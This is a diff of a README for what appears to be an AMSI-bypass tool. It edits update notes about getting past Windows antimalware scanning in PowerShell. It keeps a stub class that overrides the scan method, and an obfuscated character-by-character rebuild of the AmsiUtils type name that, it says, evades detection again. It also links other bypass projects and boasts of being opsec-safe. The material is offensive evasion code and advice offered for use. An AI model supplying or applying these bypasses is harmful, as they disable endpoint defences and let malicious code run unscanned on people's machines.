@@ -20,22 +20,17 @@ Matt Graeber first introduced the technique to bypass AMSI by using reflection i
 ! For POWERSHELL example, class TrollAMSI{static [int] M([string]$c, [string]$s){ $c = ""; return 1}}
 ```
 ```diff
-! UPDATE 05/06/2024 
-! Refer to TrollAMSIdotnet for amsi bypass for Assembly.Load()
-```
-```diff
 ! UPDATE 11/11/2024 
 !  "System.Management.Automation.AmsiUtils" is being flagged now, just do a basic obfuscation of it, like the example below and it works again 
 ! $o = [Ref].Assembly.GetType([System.String]::Join("", "S", "y", "s", "t", "e", "m", ".", "M", "a", "n", "a", "g", "e", "m", "e", "n", "t", ".", "A", "u", "t", "o", "m", "a", "t", "i", "o", "n", ".", "A", "m", "s", "i", "U", "t", "i", "l", "s"))
 ```
 ```diff
 ! UPDATE 27/05/25
-! if this doesnt work, you can try https://github.com/cybersectroll/TrollDisappearKey 
-```
-```diff
-! UPDATE 29/05/25
+! if this doesnt work, you can try https://github.com/cybersectroll/TrollDisappearKey
 ! if this doesnt work, you can try https://github.com/cybersectroll/TrollAMSI2
+! Refer to TrollAMSIdotnet for amsi bypass for Assembly.Load()  <-- ***still works 2025/06/15***
 ```
+
 
 ## Benefits
 - No P/Invoke or win32 API calls used such as VirtualProtect hence **WAAAAAY more opsec safe**
